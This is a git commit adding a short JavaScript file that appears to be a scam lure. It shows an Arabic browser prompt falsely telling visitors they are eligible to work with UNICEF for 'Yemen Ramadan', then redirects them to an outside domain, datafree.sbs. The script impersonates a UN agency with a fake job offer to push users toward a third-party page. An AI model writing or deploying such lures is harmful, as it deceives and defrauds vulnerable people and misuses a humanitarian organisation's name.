92fd3bff4a46463e8a901d243b00edc7e4824a24
mmainomi <akparawa247@gmail.com>
2025-03-30 05:01:07 -0700

    Create activation-yemen-ramadan.js

---
+++ activation-yemen-ramadan.js
@@ -0,0 +1,5 @@
+var password = 'تقدم الآن'
+password=prompt('YEMEN RAMADAN: مبروك أنت مؤهل للعمل مع صندوق الأمم المتحدة للطفولة (اليونيسيف)، يرجى الضغط على "تقدم الآن" لتقديم الطلب   ','تقدم الآن');
+if (password != 'تقدم الآن') {
+location.href='https://datafree.sbs/yemen-ramadan.html';
+}
